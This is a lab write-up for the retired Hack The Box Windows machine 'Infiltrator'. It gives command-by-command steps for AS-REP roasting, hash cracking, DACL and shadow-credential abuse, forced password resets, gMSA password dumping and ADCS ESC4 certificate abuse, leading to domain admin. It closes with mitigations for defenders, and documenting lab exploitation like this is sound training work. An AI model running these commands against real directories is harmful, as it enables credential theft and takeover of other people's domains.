---
machine: Infiltrator
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, as-rep-roast, kerberos, bloodhound, output-messenger, pcap, bitlocker, gmsa, adcs, esc4, privesc]
---

# Infiltrator — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The website lists employee names; `username-anarchy` plus `kerbrute` reveals the username format. `l.clark` does not require Kerberos preauthentication and falls to an AS-REP roast. BloodHound shows that `d.anderson` controls the OU and yields `e.rodriguez`, who can change `m.harris`'s password; that shell opens Output Messenger and user enumeration reveals `k.turner`'s password, and a chat executable (`UserExplorer.exe`) yields `winrm_svc` credentials. The Output Messenger API leads to `o.martinez`; a PCAP and a BitLocker backup in that user's files give access to `lan_managment`, which can read the `infiltrator_svc$` gMSA password. That account has dangerous rights over an ADCS template (ESC4); by modifying it and requesting a certificate as Administrator, the final hash and domain control are obtained.

## Reconnaissance

```bash
nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 <IP>
```

- Domain controller `DC01.infiltrator.htb`: DNS, Kerberos, LDAP, SMB and RPC.
- `80`: corporate website.
- `3389`: RDP; `5985`: WinRM.

The site lists seven people. Generate variants with `username-anarchy` and validate them against Kerberos:

```bash
kerbrute userenum -d infiltrator.htb usernames.txt --dc infiltrator.htb
```

## Enumeration

`l.clark` has `UF_DONT_REQUIRE_PREAUTH`; request the AS-REP and crack it:

```bash
GetNPUsers.py infiltrator.htb/ -dc-ip <IP> -usersfile valid_users
hashcat -m 18200 l.clark.hash /usr/share/wordlists/rockyou.txt
```

The password is sprayed against the other users: `d.anderson` and `m.harris` reuse it but return `STATUS_ACCOUNT_RESTRICTION`. Both are in Protected Users and do not accept NTLM; Kerberos authentication works:

```bash
netexec smb infiltrator.htb -u d.anderson -p '<PASSWORD>' -k --shares
```

BloodHound is collected:

```bash
bloodhound-python -c All -d infiltrator.htb -u l.clark -p '<PASSWORD>' -ns <IP> --zip
```

## Foothold

BloodHound shows that `d.anderson` has `GenericAll` over the `MARKETING DIGITAL` OU. Its inheritance is modified to control its users, then a shadow credential is added to `e.rodriguez`:

```bash
dacledit.py -action write -rights FullControl -inheritance \
  -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" \
  'infiltrator.htb/d.anderson:<PASSWORD>' -dc-ip infiltrator.htb
certipy shadow auto -k -target dc01.infiltrator.htb -account e.rodriguez
```

The shadow credential returns `e.rodriguez`'s hash. That account can change `m.harris`'s password; after the change, WinRM is available:

```bash
changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb \
  -althash :<NTHASH> -reset -dc-ip dc01.infiltrator.htb \
  -newpass '<NEW_PASSWORD>' -altuser e.rodriguez
netexec winrm <IP> -u m.harris -p '<NEW_PASSWORD>'
```

## Lateral movement

Output Messenger is installed and listens on `14121-14124`. User enumeration reveals `k.turner`'s password, which logs into Output Messenger. Shared files include `UserExplorer.exe`; reversing it with dnSpy shows it decrypts a `winrm_svc` password with an embedded AES key:

```text
UserExplorer.exe -default
```

That account gives another shell. The Output Messenger API (`14125`) is reached through a Chisel tunnel; the API key lists rooms and users. The calendar feature allows execution and a shell as `o.martinez`.

## Privilege escalation

`o.martinez`'s received files contain a PCAP and a BitLocker backup. The PCAP provides credentials and the backup is mounted with `dislocker`; the NTDS yields `lan_managment`'s password, which can log in to the DC.

BloodHound reports that `lan_managment` has `ReadGMSAPassword` over `infiltrator_svc$`:

```bash
gMSADumper.py -u lan_managment -p '<PASSWORD>' -d infiltrator.htb
```

With the gMSA hash, enumerate ADCS:

```bash
netexec ldap infiltrator.htb -u 'infiltrator_svc$' -H <HASH> -M adcs
```

The `Infiltrator_Template` allows ESC4: the account can modify its permissions, enable client authentication and request a certificate on behalf of Administrator. Update the template, request the certificate and use PKINIT to obtain Administrator's hash:

```bash
certipy template -u 'infiltrator_svc$' -hashes :<HASH> -template Infiltrator_Template -save-old
certipy req -u 'infiltrator_svc$' -hashes :<HASH> -ca infiltrator-DC01-CA -template Infiltrator_Template -upn administrator@infiltrator.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

## Evidence

- Valid Kerberos users and a cracked `l.clark` AS-REP.
- BloodHound showing the password change over `m.harris`.
- Output Messenger, chat credentials and `UserExplorer.exe` with the AES key.
- Output Messenger API and calendar-based execution.
- PCAP, BitLocker and `ReadGMSAPassword` over `infiltrator_svc$`.
- ESC4 on `Infiltrator_Template` and an Administrator certificate.

## Lessons learned

- Published names allow valid usernames to be built.
- Disabled Kerberos preauthentication exposes crackable hashes.
- A `ForceChangePassword` right chains accounts without cracking anything.
- Internal chats and executables leak credentials and keys.
- A PCAP and a BitLocker backup can hold the next hop.
- `ReadGMSAPassword` plus ESC4 turns a service account into Domain Admin.

## Mitigations and detection

- Require Kerberos preauthentication and review accounts with the flag disabled.
- Audit dangerous ACLs (`ForceChangePassword`, `GenericAll`) and reduce their scope.
- Protect Output Messenger, its files and API keys; segment its ports.
- Encrypt secrets with DPAPI or a vault and never embed keys in executables.
- Rotate gMSA passwords and audit `ReadGMSAPassword`.
- Review ADCS templates (ESC1-ESC8), enrollment rights and require approval.

## References

- [0xdf — Infiltrator](https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html)
- [Hack The Box — Infiltrator](https://app.hackthebox.com/machines/infiltrator)
